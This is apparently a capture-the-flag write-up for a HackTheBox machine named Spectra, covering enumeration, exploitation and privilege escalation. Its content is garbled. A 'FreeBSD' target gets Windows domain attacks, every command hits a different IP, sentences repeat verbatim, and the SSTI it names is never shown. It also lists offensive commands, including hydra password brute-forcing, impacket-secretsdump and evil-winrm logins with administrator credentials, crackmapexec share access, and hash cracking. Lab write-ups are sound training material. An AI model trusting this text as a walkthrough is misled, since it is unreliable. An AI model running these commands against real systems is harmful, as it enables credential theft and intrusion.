---
TitleSEO: "HackTheBox — Spectra (Medium FreeBSD) | ZureFX"
TitlePost: "HackTheBox — Spectra (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Spectra. Pass the Hash and SSTI to achieve medium compromise on FreeBSD."
Keywords: "pwntilldawn, medium, offsec"
URL: "https://zurefx.github.io/writeups/htb-spectra-212.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-spectra-212/"
Date: "2025-02-15"
Tags: "PwnTillDawn, Medium, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-spectra-212"
Permalink: "/writeups/htb-spectra-212.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Spectra** is rated **Medium** on HackTheBox. It runs **FreeBSD** and the IP address during this analysis was `10.87.198.211`.

### Objectives

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.91.72.119 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.29.184.97 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p21,5432,8443 10.57.209.214 -oN scan.txt
nmap -sCV -p993,143,8888 10.114.9.214 -oN scan.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.82.170.57
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.147.137 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p995,993,8443 10.115.163.132 -oN scan.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.47.16 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.95.10.181/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.126.48.138
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **Pass the Hash**.

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p80,5432,8888 10.31.168.158 -oN scan.txt
crackmapexec smb 10.57.18.190 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

## Privilege Escalation

### Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.204.188/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.31.49.142
gobuster dir -u http://10.127.127.78/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.122.8.21 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.63.168.205 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `crackmapexec`
- `ldapsearch`
- `nikto`
- `secretsdump`
- `smbclient`

### Key Takeaways

- Pass the Hash
- SSTI
